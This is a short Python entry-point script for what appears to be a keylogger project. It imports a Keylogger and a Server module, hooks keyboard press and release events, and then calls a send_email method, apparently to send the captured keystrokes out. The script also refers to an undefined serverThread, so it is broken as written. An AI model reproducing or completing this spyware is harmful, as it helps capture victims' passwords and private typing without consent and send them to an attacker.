from server import *
from keylogV2 import *
from threading import Thread, Lock


def main():

    lock = Lock()
    logger = Keylogger(lock)
    myServer = Server(lock)

    with Listener(on_press = logger.on_press, on_release = logger.on_release) as listener:
        listener.join()

    myServer.send_email()
    myServer.kill()
    serverThread.join()


if __name__ == "__main__":
    main()
